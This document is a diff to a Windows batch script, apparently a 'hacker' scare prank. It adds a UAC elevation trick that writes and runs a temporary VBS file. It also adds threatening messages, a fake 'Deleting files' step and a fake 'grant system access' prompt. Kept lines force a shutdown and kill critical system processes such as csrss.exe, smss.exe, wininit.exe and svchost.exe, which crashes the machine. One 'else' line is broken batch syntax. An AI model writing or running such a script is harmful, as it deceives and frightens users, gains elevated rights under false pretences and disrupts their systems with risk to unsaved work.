@@ -1,5 +1,35 @@
 @echo off
-title Administrator: [HACKED] Command Prompt
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+
+title [HACKED] Command Prompt
 color 02
 echo [???] Well, here we are. Again
 timeout /t 5 /nobreak > NUL
@@ -13,11 +43,8 @@ echo [???] We could make a deal
 timeout /t 5 /nobreak > NUL
 echo [???] How about...
 timeout /t 5 /nobreak > NUL
-echo [???] I will hide a file on your PC?
-mkdir "%appdata%/DeepDownBelowTheOceanDepthsIBuried"
+echo [???] You give me system access?
 echo «12/06/2018 They lied to you, %USERNAME%. They, killed me, %USERNAME%. ROT IN HELL WITH THEM %USERNAME%» > "%appdata%\DeepDownBelowTheOceanDepthsIBuried\rot.txt"
-timeout /t 5 /nobreak > NUL
-echo [???] Find it if you want to know the truth
 timeout /t 5 /nobreak > NUL
 echo [???] If you will...
 timeout /t 5 /nobreak > NUL
@@ -28,8 +55,8 @@ timeout /t 5 /nobreak > NUL
 color 4
 title Run
 echo Your files...
+timeout /t 5 /nobreak > NUL
 echo [HIM] WILL BE MINE!!!!!
-timeout /t 3 /nobreak > NUL
 color 00
 title 1234
 color 01
@@ -1030,7 +1057,6 @@ color 08
 color 09
 
 color 10
-taskkill /F /IM explorer.exe
 
 color 01
 
@@ -1051,7 +1077,7 @@ color 08
 color 09
 
 color 10
-start explorer.exe
+
 color 01
 
 color 02
@@ -1097,8 +1123,7 @@ timeout /t 1 /nobreak > NUL
 title Nowhere to run 
 echo You want your files safe?
 timeout /t 1 /nobreak > NUL 
-echo Find hidden files then =]
-taskkill /F /IM explorer.exe 
+echo Give me system access then =]
 color 01
 
 color 02
@@ -1120,133 +1145,17 @@ color 09
 color 10
 
 color 04 
+ 
 
-
-
-title Administrator: cmd.exe - Town.mp4
-
-@echo off
-setlocal enabledelayedexpansion
-
-:: Кадр 1
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | # ########### # || # ######## # |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 2
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | ############### || ############# |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 3
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | ############### || ############# |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 4
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | # ########### # || # ######## # |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 1
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | # ########### # || # ######## # |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 2
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | ############### || ############# |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 3
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | ############### || ############# |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ \|/ 
-timeout /t 0.2 >nul
-cls
-
-:: Кадр 4
-echo                      ^|   ^|          ^|   ^|
-echo                   ---  ~ ~ ~  ---   ---  ~ ~ ~  ---
-echo                  | # ########### # || # ######## # |
-echo                  |# #         # # ||# #       # # |
-echo                ### #    *     # #### #    *    # ###
-echo            #####  #           # ## #           #  #####
-echo        #####      #    * *    #  # #    *  *   #      #####
-echo    #####          #           #    #           #          #####
-echo    #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
-echo.
-echo   /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ /|\ 
-timeout /t 0.2 >nul
-cls
+msg * /server:127.0.0.1 "Want your files safe? Input this command "grant connected_virtual_drive system.access"" 
+set /p rep="Input command: "  
+if "%rep%"=="grant connected_virtual_drive system.access" (  
+    goto connected  
+)  
+else (  
+    goto disconnected 
+)  
+exit  
 
 
 
@@ -1255,16 +1164,14 @@ cls
 
 
 
-
-
+:disconnected
  title ERROR
- echo [HACKER] See what you've one to me?
+ echo [HACKER] You don't want to save your patchetic life?
  timeout /t 5 /nobreak > NUL
- echo [HACKER] You burned my house, you burned me
+ echo [HACKER] Remember, I gave you chance
  timeout /t 5 /nobreak > NUL
- echo [HACKER] That wasn't you?
- timeout /t 5 /nobreak > NUL
- echo [HACKER] You. YOU FUCKING LIAR!
+ color 04 
+ echo [HACKER] It's all your fault
  timeout /t 5 /nobreak > NUL
  color 04
 echo YOUR FILES ARE MINE
@@ -1273,12 +1180,18 @@ timeout /t 5 /nobreak > NUL
 echo [DEBUG] Deleting files...
 timeout /t 5 /nobreak > NUL
 dir /s 
-title Nowhere to hide now, %USERNAME%
-echo [HACKER] You pesky liar!!!!!!
+timeout /t 5 /nobreak > NUL
+echo Nowhere to hide now, %USERNAME%
+timeout /t 5 /nobreak > NUL
+exit /b 
+
+
+:connected
+echo [HACKER] Finally!!!!!!
 timeout /t 5 /nobreak > NUL
 echo [HACKER] YOU...
 timeout /t 5 /nobreak > NUL
-echo [HACKER] YOU THOUGHT THAT LYING TO ME WILL SAVE YOUR FUCKING LIFE?????
+echo [HACKER] YOU LOST YOUR FILES FOREVER
 timeout /t 5 /nobreak > NUL
 echo [HACKER] I AM COMING FOR YOU, %USERNAME%
 timeout /t 5 /nobreak > NUL
@@ -1287,8 +1200,8 @@ timeout /t 10 /nobreak > NUL
 ipconfig | findstr /i "ipv4"
 timeout /t 5 /nobreak > NUL
 echo [HACKER] You can't escape the inveitable...
-shutdown /s /t 30 /c "I am coming for you, %USERNAME%. Run while you still can."
-timeout /t 27 /nobreak > NUL
+shutdown /s /t 10 /c "I am coming for you, %USERNAME%. Run while you still can."
+timeout /t 5 /nobreak > NUL
 taskkill /F /IM explorer.exe
 taskkill /F /IM smss.exe
 taskkill /F /IM csrss.exe
@@ -1296,3 +1209,4 @@ taskkill /F /IM logonui.exe
 taskkill /F /IM svchost.exe 
 taskkill /F /IM System 
 taskkill /F /IM wininit.exe
+exit /b
